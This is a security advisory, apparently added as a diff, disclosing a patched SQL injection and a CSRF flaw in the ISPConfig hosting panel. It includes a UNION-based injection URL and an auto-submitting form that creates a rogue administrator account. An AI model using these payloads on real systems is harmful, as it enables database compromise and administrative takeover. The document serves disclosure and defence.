@@ -1,0 +1,87 @@
+Advisory ID: HTB23260
+Product: ISPConfig
+Vendor: http://www.ispconfig.org
+Vulnerable Version(s): 3.0.5.4p6  and probably prior
+Tested Version: 3.0.5.4p6 
+Advisory Publication:  May 20, 2015  [without technical details]
+Vendor Notification: May 20, 2015 
+Vendor Patch: June 4, 2015 
+Public Disclosure: June 10, 2015 
+Vulnerability Type: SQL Injection [CWE-89], Cross-Site Request Forgery [CWE-352]
+CVE References: CVE-2015-4118, CVE-2015-4119
+Risk Level: High 
+CVSSv2 Base Scores: 5.8 (AV:N/AC:L/Au:M/C:P/I:P/A:P),  7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C)
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered two vulnerabilities in a popular hosting control panel ISPConfig. The vulnerabilities can be exploited to execute arbitrary SQL commands in application database, perform a CSRF attack and gain complete control over the web application.
+
+
+1) SQL Injection in ISPConfig: CVE-2015-4118
+
+The vulnerability exists due to insufficient filtration of input data passed via the "server" HTTP GET parametre to "/monitor/show_sys_state.php" script before executing a SQL query. A remote authenticated attacker can pass arbitrary SQL commands to the vulnerable script and execute them in application’s database. 
+
+Successful exploitation of this vulnerability will allow an attacker to read, insert and modify arbitrary records in database and compromise the entire web application, but requires the attacker to be authenticated and to have "monitor" privileges. However, in combination with the CSRF vulnerability to which the application is also vulnerable, this vulnerability becomes exploitable by remote non-authenticated attacker. 
+
+A simple exploit below will display MySQL server version. First, use the following HTTP request to execute the SQL query:
+
+https://[host]/monitor/show_sys_state.php?state=server&server=-1%20UNION%20SELECT%201,version%28%29%20--%202|-
+
+After that visit the page mentioned below, the result of MySQL 'version()' function will be displayed in the HTML code of the page:
+
+https://[host]/monitor/show_data.php?type=mem_usage
+
+
+2) CSRF (Cross-Site Request Forgery) in ISPConfig: CVE-2015-4119
+
+The vulnerability exists due to failure in the "/admin/users_edit.php" script to properly verify the origin of the HTTP request. A remote attacker can create a specially crafted web page with CSRF exploit, trick a logged-in administrator to visit this page and create a new user with administrative privileges. 
+
+A simple CSRF exploit below creates an administrative account with username "immuniweb" and password "immuniweb":
+
+
+<form action = "https://[host]/admin/users_edit.php" method = "POST" enctype = "multipart/form-data">
+<input type="hidden" name="username" value="immuniweb">
+<input type="hidden" name="passwort" value="immuniweb">
+<input type="hidden" name="repeat_password" value="immuniweb">
+<input type="hidden" name="modules[]" value="vm">
+<input type="hidden" name="modules[]" value="mail">
+<input type="hidden" name="modules[]" value="help">
+<input type="hidden" name="modules[]" value="monitor">
+<input type="hidden" name="startmodule" value="vm">
+<input type="hidden" name="app_theme[]" value="default">
+<input type="hidden" name="typ[]" value="admin">
+<input type="hidden" name="active" value="1">
+<input type="hidden" name="language" value="en">
+<input type="submit" id="btn"> 
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to ISPConfig 3.0.5.4p7
+
+More Information:
+http://bugtracker.ispconfig.org/index.php?do=details&task_id=3898
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23260 - https://www.htbridge.com/advisory/HTB23260 - Multiple vulnerabilities in ISPConfig.
+[2] ISPConfig - http://www.ispconfig.org - Hosting Control Panel Software.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
